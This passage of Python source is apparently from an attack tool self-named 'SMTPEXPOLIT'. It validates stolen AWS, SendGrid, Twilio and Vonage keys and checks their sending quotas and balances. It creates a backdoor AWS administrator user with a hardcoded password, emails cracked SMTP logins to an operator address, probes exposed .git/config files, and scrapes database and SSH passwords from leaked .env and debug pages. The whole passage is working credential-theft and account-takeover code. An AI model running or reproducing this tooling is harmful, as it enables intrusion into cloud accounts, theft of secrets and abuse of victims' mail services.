            s.login(smtp_username, smtp_password)
            s.sendmail(sender_email, receiver_email, message.as_string())
            smtp_status = "GOOD_SMTP"
            build = 'URL: ' + str(url) + '\nSMTP_HOST: ' + str(smtp_host) + '\nSMTP_PORT: ' + str(
                smtp_port) + '\nSMTP_USERNAME: ' + str(smtp_username) + '\nSMTP_PASSWORD: ' + str(
                smtp_password) + '\nSMTP_FROM: ' + str(sender_email)
            remover = build.replace('\r', '')
            admin = open("Results/Hits_valid_smtps.txt", "a")
            admin.write(remover + '\n\n')
            admin.close()
            s.quit()
            s.close()
            return smtp_status
        except Exception as e:
            return "BAD_SMTP"

class MAKE:
    def __init__(self):
        self.DATE = "11111111"
        self.SERVICE = "ses"
        self.MESSAGE = "SendRawEmail"
        self.TERMINAL = "aws4_request"
        self.VERSION = 0x04

    def sign(self, key, msg):
        return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()

    def calculate_key(self, secret_access_key, region):
        signature = self.sign(("AWS4" + secret_access_key).encode('utf-8'), self.DATE)
        signature = self.sign(signature, region)
        signature = self.sign(signature, self.SERVICE)
        signature = self.sign(signature, self.TERMINAL)
        signature = self.sign(signature, self.MESSAGE)
        signature_and_version = bytes([self.VERSION]) + signature
        smtp_password = base64.b64encode(signature_and_version)
        return smtp_password.decode('utf-8')

    def get_key(self, aws_sec, aws_region):
        aws_smtp_password = self.calculate_key(aws_sec, aws_region)
        return aws_smtp_password

def check_aws_smtp(url, aws_key, aws_sec, aws_region):
    try:
        client = boto3.client('ses', aws_access_key_id=aws_key, aws_secret_access_key=aws_sec, region_name=aws_region)
        info = client.get_send_quota()
        smtp_limit = int(info['Max24HourSend'])
        allready_send = int(info['SentLast24Hours'])
        send_rate = int(info['MaxSendRate'])
        smtp_host = f"email-smtp.{aws_region}.amazonaws.com"
        smtp_port = "587"
        smtp_username = aws_key
        get_password = MAKE()
        smtp_password = get_password.get_key(aws_sec, aws_region)
        smtp_from = client.list_verified_email_addresses()['VerifiedEmailAddresses'][0]
        stil_left = smtp_limit - allready_send
        test_smtp = SMTPTEST()
        build = 'URL: ' + str(url) + '\nSMTP_HOST: ' + str(
            smtp_host) + '\nSMTP_PORT: ' + str(smtp_port) + '\nSMTP_USERNAME: ' + str(
            smtp_username) + '\nSMTP_PASSWORD: ' + str(smtp_password) + '\nMAILFROM: ' + str(
            smtp_from) + '\nSMTP_LIMIT: ' + str(smtp_limit) + '\nSENDING LEFT: ' + str(
            stil_left) + '\nSMTP_SEND_RATE: ' + str(send_rate) + '\nSMTP_SENDSTATUS: ' + str(test_smtp.smtp_test(
            url, smtp_host, smtp_username, smtp_password, smtp_from, smtp_port))
        remover = str(build).replace('\r', '')
        aws_schrijf = open('Results/AWS_SMTP_HIT_FULLINFO.txt', 'a+')
        aws_schrijf.write(remover + '\n\n')
        aws_schrijf.close()
        aws_status = "GOOD_SES"
        return aws_status
    except Exception as e:
        aws_status = "BAD_SES"
        return aws_status

def createiam(aws_key, aws_sec, aws_region):
    try:
        client = boto3.client('iam', aws_access_key_id=aws_key, aws_secret_access_key=aws_sec, region_name=aws_region)
        try_create = client.create_user(UserName="SMTPEX")
        seh = f"User: {try_create['User']['UserName']}"
        seh2 = f"User: {try_create['User']['Arn']}"
    except Exception as e:
        aws_status = "BAD_IAM"
        return aws_status
    try:
        client.create_login_profile(
            Password="Passw0rd@1973@#$",
            PasswordResetRequired=False,
            UserName="SMTPEX"
        )
        killer = "SMTPEX" + "|" + "Passw0rd@1973@#$" + "|" + seh + "|" + seh2
        remover = str(killer).replace('\r', '')
        iam_admin = open('Results/IAM_ACCOUNT_login.txt', 'a+')
        iam_admin.write(remover + '\n')
        iam_admin.close()
    except Exception:
        aws_status = "BAD_IAM"
        return aws_status
    try:
        client.attach_user_policy(PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess', UserName="SMTPEX")
        killer = "SMTPEX" + "|" + "Passw0rd@1973@#$" + "|" + seh + "|" + seh2
        remover = str(killer).replace('\r', '')
        iam_admin = open('Results/IAM_ACCOUNT_ADMIN.txt', 'a+')
        iam_admin.write(remover + '\n')
        iam_admin.close()
        try:
            client.delete_access_key(AccessKeyId="SMTPEX")
        except:
            pass
        aws_status = "GOOD_IAM"
        return aws_status
    except Exception:
        aws_status = "BAD_IAM"
        return aws_status

def send_sms(smtp):
	HOST, PORT, usr, pas = smtp.strip().split('|')
	time.sleep(2)
	try:
		msg = email.message.Message()
		msg['From'] = usr
		msg['To'] = send_sms_to
		Message_Text = f"SMTP Cracker : V1.0 - Rebuild\n~ Result SMTP => {HOST}|{PORT}|{usr}|{pas}"
		msg['Subject'] = "SMTPEX RESULT : V1.0 - Rebuild"
		msg.add_header('Content-Type', 'text')
		msg.set_payload(Message_Text)
		smtp_obj = smtplib.SMTP(HOST, PORT)
		smtp_obj.starttls()
		smtp_obj.login(usr, pas)
		smtp_obj.sendmail(msg['From'], [msg['To']], msg.as_string())
		smtp_obj.quit()
		return True
	except Exception as e:
		return False

def smtp_check(smtp):
	HOST, PORT, usr, pas = smtp.strip().split('|')
	time.sleep(2)
	try:
		server = smtplib.SMTP(HOST, PORT)
		server.ehlo()
		server.starttls()
		server.login(usr, pas)
		msg = MIMEMultipart()
		msg['Subject'] = 'SMTPEX RESULT : V1.0 - Rebuild'
		msg['From'] = usr
		msg['To'] = toaddr
		msg.add_header('Content-Type', 'text/html')
		data = f'<!DOCTYPE html>\n<html lang="en">\n<html>\n<body>\n<p>SMTP Cracked<br>By SMTPEXPOLIT v1.0 - Rebuild</p>\n<p>-------------------</p>\n<p>HOST   : {HOST}</p>\n<p>PORT   : {PORT}</p>\n<p>USER   : {usr}</p>\n<p>PASSWORD  : {pas}</p>\n<p>-------------------</p>\n\n~ Result SMTP => {HOST}|{PORT}|{usr}|{pas}</body>\n</html>\n'
		msg.attach(MIMEText(data, 'html', 'utf-8'))
		server.sendmail(usr, [msg['To']], msg.as_string())
		console.print(f'[+] SMTP WORKING ! => {smtp}', style='green')
		server.quit()
		xSave("Cracked", "SMTP-[WORKING]", smtp)
		return True
	except Exception as e:
		console.print(f'[-] SMTP DEAD ! => {smtp}', style='red')
		xSave("Cracked", "SMTP-[Dead]", smtp)
		return False

def smtp_ssl(lista):
	usr, pas = lista.strip().split(':')
	time.sleep(2)
	try:
		server = smtplib.SMTP(xxxHOSTXX, xxxPORTXX)
		server.ehlo()
		server.starttls()
		server.login(usr, pas)
		msg = MIMEMultipart()
		msg['Subject'] = 'SMTPEX RESULT : V1.0 - Rebuild'
		msg['From'] = usr
		msg['To'] = get_toaddr()
		msg.add_header('Content-Type', 'text/html')
		data = f'<!DOCTYPE html>\n<html lang="en">\n<html>\n<body>\n<p>SMTP Cracked<br>By SMTPEXPOLIT v1.0 - Rebuild</p>\n<p>-------------------</p>\n<p>HOST   : {HOST}</p>\n<p>PORT   : {PORT}</p>\n<p>USER   : {usr}</p>\n<p>PASSWORD  : {pas}</p>\n<p>-------------------</p>\n\n~ Result SMTP => {HOST}|{PORT}|{usr}|{pas}</body>\n</html>\n'
		msg.attach(MIMEText(data, 'html', 'utf-8'))
		server.sendmail(usr, [msg['To']], msg.as_string())
		console.print(f'[+] SMTP WORKING ! => {lista}', style='green')
		server.quit()
		xSave("Cracked", "SMTP-[WORKING]", lista.strip())
		return True
	except Exception as e:
		console.print(f'[-] SMTP DEAD ! => {lista}', style='red')
		xSave("Cracked", "SMTP-[Dead]", lista.strip())
		return False

def smtp_no_ssl(lista):
	usr, pas = lista.strip().split(':')
	time.sleep(2)
	try:
		server = smtplib.SMTP(xxxHOSTXX, xxxPORTXX)
		server.ehlo()
		server.login(usr, pas)
		msg = MIMEMultipart()
		msg['Subject'] = 'SMTPEX RESULT : V1.0 - Rebuild'
		msg['From'] = usr
		msg['To'] = get_toaddr()
		msg.add_header('Content-Type', 'text/html')
		data = f'<!DOCTYPE html>\n<html lang="en">\n<html>\n<body>\n<p>SMTP Cracked<br>By SMTPEXPOLIT v1.0 - Rebuild</p>\n<p>-------------------</p>\n<p>HOST   : {HOST}</p>\n<p>PORT   : {PORT}</p>\n<p>USER   : {usr}</p>\n<p>PASSWORD  : {pas}</p>\n<p>-------------------</p>\n\n~ Result SMTP => {HOST}|{PORT}|{usr}|{pas}</body>\n</html>\n'
		msg.attach(MIMEText(data, 'html', 'utf-8'))
		server.sendmail(usr, [msg['To']], msg.as_string())
		console.print(f'[+] SMTP WORKING ! => {lista}', style='green')
		server.quit()
		xSave("Cracked", "SMTP-[WORKING]", lista.strip())
		return True
	except Exception as e:
		console.print(f'[-] SMTP DEAD ! => {lista}', style='red')
		xSave("Cracked", "SMTP-[Dead]", lista.strip())
		return False

def Check_twilio(sid, token, url):
	try:
		client = Client(sid, token)
		r = requests.get("https://api.twilio.com/2010-04-01/Accounts/"+sid+"/Balance.json", auth=(sid,token))
		Json = json.dumps(r.json())
		resp = json.loads(Json)
		#print(resp)
		balance = resp['balance']
		currency = resp['currency']
		check_format = f"{sid}|{token}|{balance}{currency}"
		xSave("Cracked", "Twilio-[CHECK]", check_format)
		xSave("Cracked", "Twilio-[VALID]", f"+++++++++++++++\nURL={url}\nACCOUNT_SID={sid}\nSECRET={token}\nBALANCE={balance}{currency}+++++++++++++++\n")
		console.print(f'[+] Twilio Has Balance {balance}{currency} left.', style='green')
		return True
	except Exception as e:
		#console.print(f'[-] Twilio Failed : {e}.', style='red')
		check_format = f"{sid}|{token}"
		xSave("Cracked", "Twilio-[Failed]", check_format)
		return False

def Check_Vonage(apikey, keysecret, url):
	try:
		client_vonage = vonage.Client(key=apikey, secret=keysecret)
		result = client_vonage.get_balance()
		check_format = f"{apikey}|{keysecret}|{result['value']}|{result['autoReload']}"
		xSave("Cracked", "Vonage-[CHECK]", check_format)
		xSave("Cracked", "Vonage-[VALID]", f"+++++++++++++++\nURL={url}\nAPIKEY={apikey}\nSECRET={keysecret}\nBALANCE={result['value']}\nReload{result['autoReload']}+++++++++++++++\n")
		console.print(f"[+] Vonage Has Balance {result['value']}\tReload: {result['autoReload']}.", style='green')
		return True
	except Exception as e:
		check_format = f"{apikey}|{keysecret}"
		xSave("Cracked", "Vonage-[Failed]", check_format)
		console.print(f'[-] Vonage Failed : {e}.', style='red')
		return False

def gitcheck(url):
	try:
		git_path = "/.git/config"
		x = requests.get(url + git_path, allow_redirects=False, verify=False)
		if '[remote "origin"]' in x.text:
			if "url =" in x.text:
				grab_url = re.findall('url = (.*?)\n', x.text)[0]
				check_grab = requests.get(grab_url, verify=False)
				if check_grab.status_code == 200:
					check_format = f"VIEW_URL: {url}/.git/config\nGIT_URL: {grab_url}\n"
					xSave("Cracked", "GitConfigVulns", check_format)
	except:
		pass

def Check_Sendgrid(secret):
	head = {
		"Authorization":"Bearer {}".format(secret),
		"Accept":"application/json"
	}
	x = requests.get('https://api.sendgrid.com/v3/user/credits',headers=head).json()
	if 'errors' in x:
		console.print(f'[-] Sendgrid Dead {secret}', style='red')
		return True
	else:
		r = requests.get('https://api.sendgrid.com/v3/user/email', headers=head).json()
		Total = x['total']
		remain = x['remain']
		email = r['email']
		check_format = f"smtp.sendgrid.net|587|apikey|{secret}|{email}|{Total}/{remain}"
		xSave("Cracked", "Sendgrid-[CHECK]", check_format)
		xSave("Cracked", "Sendgrid-[VALID]", f"+++++++++++++++\nHOST=smtp.sendgrid.net\nPORT=587\nUSERNAME=apikey\nSECRET_KEY={secret}\nEMAIL={email}\nLIMIT={Total}/{remain}+++++++++++++++\n")
		console.print(f'[+] Sendgrid Valid Found With Limit {Total}/{remain}', style='green')
		return True

def Check_aws(ACCESS_KEY, SECRET_KEY, REGION, url):
	line = f"{ACCESS_KEY}|{SECRET_KEY}|{REGION}"

	if ACCESS_KEY == "-" and SECRET_KEY == '-':
		console.print(f'[+] INVALID AWS Details => {line}', style="red")
		return False

	try:
		aws_Check_smtp = check_aws_smtp(url, ACCESS_KEY, SECRET_KEY, REGION)
		createiam = createiam(ACCESS_KEY, SECRET_KEY, REGION)
	except Exception as e:
		#console.print(f"AWS-[INVALID] ~ ACCESS_KEY={ACCESS_KEY}\nSECRET_KEY={SECRET_KEY}\nEROOR ~ {e}")
		pass

	try:
		client = boto3.client('ses',
		aws_access_key_id=ACCESS_KEY,
		aws_secret_access_key=SECRET_KEY,
		region_name=REGION)
		balance = client.get_send_quota()['Max24HourSend']
		check_format = f"{ACCESS_KEY}|{SECRET_KEY}|{REGION}|{balance}"
		xSave("Cracked", "AWS-[CHECK]", check_format)
		xSave("Cracked", REGION, check_format)
		xSave("Cracked", "AWS-[VALID]", f"+++++++++++++++\nURL={url}\nACCESS_KEY={ACCESS_KEY}\nSECRET_KEY={SECRET_KEY}\nBALANCE={balance}+++++++++++++++\n")
		console.print(f'[+] AWS Valid\nACCESS_KEY {ACCESS_KEY}\nSECRET_KEY {SECRET_KEY}\nBalance: {balance}.', style='green')
		return True
	except Exception as e:
		xSave("Cracked", "AWS-[INVALID]", f"+++++++++++++++\nURL={url}\nACCESS_KEY={ACCESS_KEY}\nSECRET_KEY={SECRET_KEY}\nERROR={e}+++++++++++++++\n")
		#console.print(f"AWS-[INVALID] ~ ACCESS_KEY={ACCESS_KEY}\nSECRET_KEY={SECRET_KEY}\nEROOR ~ {e}")
		if REGION == '-':
			xSave("Cracked", "Unknown-Region [AWS]", line)
		else:
			xSave("Cracked", REGION, line)
		
		return False

def rnd_stuff_check(content):
	try:
		if Check_Smtp != 'on':
			xSave("Cracked", "SMTPS-[UNCHECKED]", content)
		else:
			smtp_check(content)

		if Check_Cpanel != 'on':
			xSave("Cracked", "CPanels-[UNCHECKED]", content)
		else:
			checker_cpanel(content)
		
		if Check_Webmails != 'on':
			xSave("Cracked", "Webmails-[UNCHECKED]", content)
		else:
			checker_webmail(content)

		if CHECK_E2S == 'on':
			send_sms(content)
			
		if Check_WHM != 'on':
			xSave("Cracked", "WHM-[UNCHECKED]", content)
		else:
			checker_whm(content)
	except:
		pass


def filter_smtp(line):
	try:
		host, port, username, password = line.strip().split("|")
		
		x = is_valid_info(line)
		if username == 'null' and password == "null":
			console.print(f'[-] INVALID SMTP => {line}', style="red")
			xSave("Cracked", "SMTPS-[Invalids]", line)
			return False
		elif x == False:
			console.print(f'[-] INVALID SMTP => {line}', style="red")
			xSave("Cracked", "SMTPS-[Invalids]", line)
			return False
		elif username == '-' or password == "-":
			console.print(f'[-] INVALID SMTP => {line}', style="red")
			xSave("Cracked", "SMTPS-[Invalids]", line)
			return False

		console.print(f'[+] Found SMTP => {line}', style="green")
		
		#Extract Cpanel/Shells/Whm/VPS
		rnd_stuff_check(line)

		for smtp_host in smtp_hosts:
			if host.lower() in smtp_host.lower():
				if '.amazonaws.com' in host:
					xSave("Cracked", f"SMTP-[AWS]", line)
				elif 'sendgrid' in host:
					Check_Sendgrid(password)
					xSave("Cracked", f"SMTP-[sendgrid]", line)
				elif '.jp' in host:
					xSave("Cracked", f"SMTP-[Japan]", line)
				elif '.it' in host:
					xSave("Cracked", f"SMTP-[Italy]", line)
				elif 'OVH' or 'ovh' in host:
					xSave("Cracked", f"SMTP-[OVH]", line)
				elif 'ionos' in host:
					xSave("Cracked", f"SMTP-[IONOS]", line)
				else:
					xSave("Cracked", f"SMTPS-[{smtp_host}]", line)
			else:
				xSave("Cracked", "SMTPS-[Random]", line)

		return True
	except Exception as e:
		return False

def get_database(resp, url):
	if "DB_HOST" in resp:
		if "DB_HOST=" in resp:
			db_host = get_param(resp, '\nDB_HOST=(.*?)\n')
			db_port = get_param(resp, '\nDB_PORT=(.*?)\n')
			db_name = get_param(resp, '\nDB_DATABASE=(.*?)\n')
			db_user = get_param(resp, '\nDB_USERNAME=(.*?)\n')
			db_pass = get_param(resp, '\nDB_PASSWORD=(.*?)\n')
			
			if db_host == 'localhost' or db_host == '' or db_host == 'null' or db_host == '127.0.0.1':
				db_host = socket.gethostbyname((clean_domain(url)))

			check_format = f"{db_host}|{db_port}|{db_name}|{db_user}|{db_pass}"
			Normal_Format = f"+++++++++++++++\nURL={url}\nHOST={db_host}\nPORT={db_port}\nNAME={db_name}\nUSERNAME={db_user}\nPASSWORD={db_pass}\n+++++++++++++++"
			x = is_valid_info(check_format)
			if x:
				console.print(f'[+] Found DataBase => {check_format}', style='green')

				if Check_VPS != 'on':
					xSave("Cracked", "VPS-[UNCHECKED]", f"{db_host}|22|{db_user}|{db_pass}")
				else:
					check_vps_details(f"{db_host}|{db_user}|{db_pass}")
				
				find_db_manager(url, db_host, db_port, db_user, db_pass, db_name)

				if db_name == 'root':
					xSave("Cracked", "DataBase-[root-Cracked]", Normal_Format)
				else:
					xSave("Cracked", "DataBase-[Check]", check_format)
					xSave("Cracked", "DataBase-[Cracked]", Normal_Format)
			else:
				console.print(f'[-] Invalid DataBase Details => {check_format}', style='red')
				xSave("Cracked", "DataBase-[Check]", check_format)

		elif "<td>DB_HOST</td>" in resp:
			db_host = get_param(resp, '<td>DB_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			db_port = get_param(resp, '<td>DB_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			db_name = get_param(resp, '<td>DB_DATABASE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			db_user = get_param(resp, '<td>DB_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			db_pass = get_param(resp, '<td>DB_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')

			if db_host == 'localhost' or db_host == '' or db_host == 'null' or db_host == '127.0.0.1':
				db_host = socket.gethostbyname((clean_domain(url)))

			check_format = f"{db_host}|{db_port}|{db_name}|{db_user}|{db_pass}"
			Normal_Format = f"+++++++++++++++\nURL={url}\nHOST={db_host}\nPORT={db_port}\nNAME={db_name}\nUSERNAME={db_user}\nPASSWORD={db_pass}\n+++++++++++++++"

			x = is_valid_info(check_format)
			if x:
				console.print(f'[+] Found DataBase => {check_format}', style='green')

				if Check_VPS != 'on':
					xSave("Cracked", "VPS-[UNCHECKED]", f"{db_host}|22|{db_user}|{db_pass}")
				else:
					check_vps_details(f"{db_host}|{db_user}|{db_pass}")
				
				find_db_manager(url, db_host, db_port, db_user, db_pass, db_name)

				if db_name == 'root':
					xSave("Cracked", "DataBase-[root-Cracked]", Normal_Format)
				else:
					xSave("Cracked", "DataBase-[Check]", check_format)
					xSave("Cracked", "DataBase-[Cracked]", Normal_Format)
			else:
				console.print(f'[-] Invalid DataBase Details => {check_format}', style='red')
				xSave("Cracked", "DataBase-[Check]", check_format)


	elif "database.default.DBDriver" in resp:
		if "database.default.DBDriver = " in resp:
			db_host = get_param(resp, '\ndatabase.default.hostname = (.*?)\n')
			db_port = get_param(resp, '\ndatabase.default.port = (.*?)\n')
			db_name = get_param(resp, '\ndatabase.default.database = (.*?)\n')
			db_user = get_param(resp, '\ndatabase.default.username = (.*?)\n')
			db_pass = get_param(resp, '\ndatabase.default.password = (.*?)\n')
			
			if db_host == 'localhost' or db_host == '' or db_host == 'null' or db_host == '127.0.0.1':
				db_host = socket.gethostbyname((clean_domain(url)))

			check_format = f"{db_host}|{db_port}|{db_name}|{db_user}|{db_pass}"
			Normal_Format = f"+++++++++++++++\nURL={url}\nHOST={db_host}\nPORT={db_port}\nNAME={db_name}\nUSERNAME={db_user}\nPASSWORD={db_pass}\n+++++++++++++++"
			x = is_valid_info(check_format)
			if x:
				console.print(f'[+] Found DataBase => {check_format}', style='green')

				if Check_VPS != 'on':
					xSave("Cracked", "VPS-[UNCHECKED]", f"{db_host}|22|{db_user}|{db_pass}")
				else:
					check_vps_details(f"{db_host}|{db_user}|{db_pass}")
				
				find_db_manager(url, db_host, db_port, db_user, db_pass, db_name)

				if db_name == 'root':
					xSave("Cracked", "DataBase-[root-Cracked]", Normal_Format)
				else:
					xSave("Cracked", "DataBase-[Check]", check_format)
					xSave("Cracked", "DataBase-[Cracked]", Normal_Format)
			else:
				console.print(f'[-] Invalid DataBase Details => {check_format}', style='red')
				xSave("Cracked", "DataBase-[Check]", check_format)

	elif "SSH_HOST=" in resp or "SSH_HOST = " in resp or "<td>SSH_HOST" in resp:
		if "SSH_HOST=" in resp:
			ssh_host = get_param(resp, '\nSSH_HOST=(.*?)\n')
			ssh_user = get_param(resp, '\nSSH_USERNAME=(.*?)\n')
			ssh_pass = get_param(resp, '\nSSH_PASSWORD=(.*?)\n')
			
			if ssh_host == 'localhost' or ssh_host == '' or ssh_host == 'null' or ssh_host == '127.0.0.1':
				ssh_host = socket.gethostbyname((clean_domain(url)))

			check_format = f"{ssh_host}|22|{ssh_user}|{ssh_pass}"
			Normal_Format = f"+++++++++++++++\nURL={url}\nHOST={ssh_host}\nPORT=22\nUSERNAME={ssh_user}\nPASSWORD={ssh_pass}\n+++++++++++++++"
			xSave("Cracked", "VPS-[UNCHECKED]", f"{ssh_host}|22|{ssh_user}|{ssh_pass}")
			check_vps_details(f"{ssh_host}|{ssh_user}|{ssh_pass}")

		elif "SSH_HOST = " in resp:
			ssh_host = get_param(resp, '\nSSH_HOST = (.*?)\n')
			ssh_user = get_param(resp, '\nSSH_USERNAME = (.*?)\n')
			ssh_pass = get_param(resp, '\nSSH_PASSWORD = (.*?)\n')
			
			if ssh_host == 'localhost' or ssh_host == '' or ssh_host == 'null' or ssh_host == '127.0.0.1':
				ssh_host = socket.gethostbyname((clean_domain(url)))

			check_format = f"{ssh_host}|22|{ssh_user}|{ssh_pass}"
			Normal_Format = f"+++++++++++++++\nURL={url}\nHOST={ssh_host}\nPORT=22\nUSERNAME={ssh_user}\nPASSWORD={ssh_pass}\n+++++++++++++++"
			xSave("Cracked", "VPS-[UNCHECKED]", f"{ssh_host}|22|{ssh_user}|{ssh_pass}")
			check_vps_details(f"{ssh_host}|{ssh_user}|{ssh_pass}")

		elif "<td>SSH_HOST</td>" in resp:
			ssh_host = get_param(resp, '<td>SSH_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			ssh_user = get_param(resp, '<td>SSH_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			ssh_pass = get_param(resp, '<td>SSH_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			
			if ssh_host == 'localhost' or ssh_host == '' or ssh_host == 'null' or ssh_host == '127.0.0.1':
				ssh_host = socket.gethostbyname((clean_domain(url)))

			check_format = f"{ssh_host}|22|{ssh_user}|{ssh_pass}"
			Normal_Format = f"+++++++++++++++\nURL={url}\nHOST={ssh_host}\nPORT=22\nUSERNAME={ssh_user}\nPASSWORD={ssh_pass}\n+++++++++++++++"
			xSave("Cracked", "VPS-[UNCHECKED]", f"{ssh_host}|22|{ssh_user}|{ssh_pass}")
			check_vps_details(f"{ssh_host}|{ssh_user}|{ssh_pass}")

	elif 'mysql://' in resp:
		mysql = get_param(resp, '<td>mysql://(.*?)</td>')
		if mysql != '-':
			console.print(f"[+] Found MySql {mysql}", style="green")
			xSave("Cracked", "DataBase-[mysql]", f"+++++++++++++++\nURL: {url}\nMYSQL_STRING: mysql://{mysql}+++++++++++++++\n")

	elif "DB_USER" in resp:
		if 'DB_USER </td><td class="v">' in resp:
			db_host = get_param(resp, 'DB_HOST </td><td class="v">(.*?) </td></tr>\n')
			db_port = get_param(resp, 'DB_PORT </td><td class="v">(.*?) </td></tr>\n')
			db_name = get_param(resp, 'DB_CONNECTION </td><td class="v">(.*?) </td></tr>\n')
			db_user = get_param(resp, 'DB_USER </td><td class="v">(.*?) </td></tr>\n')
			db_pass = get_param(resp, 'DB_PASS </td><td class="v">(.*?) </td></tr>\n')
			
			if db_host == 'localhost' or db_host == '' or db_host == 'null' or db_host == '127.0.0.1':
				db_host = socket.gethostbyname((clean_domain(url)))

			check_format = f"{db_host}|{db_port}|{db_name}|{db_user}|{db_pass}"

			Normal_Format = f"+++++++++++++++\nURL={url}\nHOST={db_host}\nPORT={db_port}\nNAME={db_name}\nUSERNAME={db_user}\nPASSWORD={db_pass}\n+++++++++++++++"
			x = is_valid_info(check_format)
			if x:
				console.print(f'[+] Found DataBase => {check_format}', style='green')

				if Check_VPS != 'on':
					xSave("Cracked", "VPS-[UNCHECKED]", f"{db_host}|22|{db_user}|{db_pass}")
				else:
					check_vps_details(f"{db_host}|{db_user}|{db_pass}")
				
				find_db_manager(url, db_host, db_port, db_user, db_pass, db_name)

				if db_name == 'root':
					xSave("Cracked", "DataBase-[root-Cracked]", Normal_Format)
				else:
					xSave("Cracked", "DataBase-[Check]", check_format)
					xSave("Cracked", "DataBase-[Cracked]", Normal_Format)
			else:
				console.print(f'[-] Invalid DataBase Details => {check_format}', style='red')
				xSave("Cracked", "DataBase-[Check]", check_format)

	elif "DB_USERNAME" in resp:
		if 'DB_USERNAME </td><td class="v">' in resp:
			db_host = get_param(resp, 'DB_HOST </td><td class="v">(.*?) </td></tr>\n')
			db_port = get_param(resp, 'DB_PORT </td><td class="v">(.*?) </td></tr>\n')
			db_name = get_param(resp, 'DB_CONNECTION </td><td class="v">(.*?) </td></tr>\n')
			db_user = get_param(resp, 'DB_USERNAME </td><td class="v">(.*?) </td></tr>\n')
			db_pass = get_param(resp, 'DB_PASSWORD </td><td class="v">(.*?) </td></tr>\n')
			
			if db_host == 'localhost' or db_host == '' or db_host == 'null' or db_host == '127.0.0.1':
				db_host = socket.gethostbyname((clean_domain(url)))

			check_format = f"{db_host}|{db_port}|{db_name}|{db_user}|{db_pass}"

			Normal_Format = f"+++++++++++++++\nURL={url}\nHOST={db_host}\nPORT={db_port}\nNAME={db_name}\nUSERNAME={db_user}\nPASSWORD={db_pass}\n+++++++++++++++"
			x = is_valid_info(check_format)
			if x:
				console.print(f'[+] Found DataBase => {check_format}', style='green')

				if Check_VPS != 'on':
					xSave("Cracked", "VPS-[UNCHECKED]", f"{db_host}|22|{db_user}|{db_pass}")
				else:
					check_vps_details(f"{db_host}|{db_user}|{db_pass}")
				
				find_db_manager(url, db_host, db_port, db_user, db_pass, db_name)

				if db_name == 'root':
					xSave("Cracked", "DataBase-[root-Cracked]", Normal_Format)
				else:
					xSave("Cracked", "DataBase-[Check]", check_format)
					xSave("Cracked", "DataBase-[Cracked]", Normal_Format)
			else:
				console.print(f'[-] Invalid DataBase Details => {check_format}', style='red')
				xSave("Cracked", "DataBase-[Check]", check_format)

	elif "DATABASE_USERNAME" in resp:
		if 'DATABASE_USERNAME </td><td class="v">' in resp:
			db_host = get_param(resp, 'DATABASE_HOST </td><td class="v">(.*?) </td></tr>\n')
			db_port = get_param(resp, 'DATABASE_PORT </td><td class="v">(.*?) </td></tr>\n')
			db_name = get_param(resp, 'DATABASE_CONNECTION </td><td class="v">(.*?) </td></tr>\n')
			db_user = get_param(resp, 'DATABASE_USERNAME </td><td class="v">(.*?) </td></tr>\n')
			db_pass = get_param(resp, 'DATABASE_PASSWORD </td><td class="v">(.*?) </td></tr>\n')
			
			if db_host == 'localhost' or db_host == '' or db_host == 'null' or db_host == '127.0.0.1':
				db_host = socket.gethostbyname((clean_domain(url)))

			check_format = f"{db_host}|{db_port}|{db_name}|{db_user}|{db_pass}"

			Normal_Format = f"+++++++++++++++\nURL={url}\nHOST={db_host}\nPORT={db_port}\nNAME={db_name}\nUSERNAME={db_user}\nPASSWORD={db_pass}\n+++++++++++++++"
			x = is_valid_info(check_format)
			if x:
				console.print(f'[+] Found DataBase => {check_format}', style='green')

				if Check_VPS != 'on':
					xSave("Cracked", "VPS-[UNCHECKED]", f"{db_host}|22|{db_user}|{db_pass}")
				else:
					check_vps_details(f"{db_host}|{db_user}|{db_pass}")
				
				find_db_manager(url, db_host, db_port, db_user, db_pass, db_name)

				if db_name == 'root':
					xSave("Cracked", "DataBase-[root-Cracked]", Normal_Format)
				else:
					xSave("Cracked", "DataBase-[Check]", check_format)
					xSave("Cracked", "DataBase-[Cracked]", Normal_Format)
			else:
				console.print(f'[-] Invalid DataBase Details => {check_format}', style='red')
				xSave("Cracked", "DataBase-[Check]", check_format)

	elif "DB_OLD_USERNAME" in resp:
		if 'DB_OLD_USERNAME </td><td class="v">' in resp:
			db_host = get_param(resp, 'DB_OLD_HOST </td><td class="v">(.*?) </td></tr>\n')
			db_port = get_param(resp, 'DB_OLD_PORT </td><td class="v">(.*?) </td></tr>\n')
			db_name = get_param(resp, 'DB_OLD_CONNECTION </td><td class="v">(.*?) </td></tr>\n')
			db_user = get_param(resp, 'DB_OLD_USERNAME </td><td class="v">(.*?) </td></tr>\n')
			db_pass = get_param(resp, 'DB_OLD_PASSWORD </td><td class="v">(.*?) </td></tr>\n')
			
			if db_host == 'localhost' or db_host == '' or db_host == 'null' or db_host == '127.0.0.1':
				db_host = socket.gethostbyname((clean_domain(url)))

			check_format = f"{db_host}|{db_port}|{db_name}|{db_user}|{db_pass}"

			Normal_Format = f"+++++++++++++++\nURL={url}\nHOST={db_host}\nPORT={db_port}\nNAME={db_name}\nUSERNAME={db_user}\nPASSWORD={db_pass}\n+++++++++++++++"
			x = is_valid_info(check_format)
			if x:
				console.print(f'[+] Found DataBase => {check_format}', style='green')

				if Check_VPS != 'on':
					xSave("Cracked", "VPS-[UNCHECKED]", f"{db_host}|22|{db_user}|{db_pass}")
				else:
					check_vps_details(f"{db_host}|{db_user}|{db_pass}")
				
				find_db_manager(url, db_host, db_port, db_user, db_pass, db_name)

				if db_name == 'root':
					xSave("Cracked", "DataBase-[root-Cracked]", Normal_Format)
				else:
					xSave("Cracked", "DataBase-[Check]", check_format)
					xSave("Cracked", "DataBase-[Cracked]", Normal_Format)
			else:
				console.print(f'[-] Invalid DataBase Details => {check_format}', style='red')
				xSave("Cracked", "DataBase-[Check]", check_format)

	elif "MYSQL_USER" in resp:
		if 'MYSQL_USER </td><td class="v">' in resp:
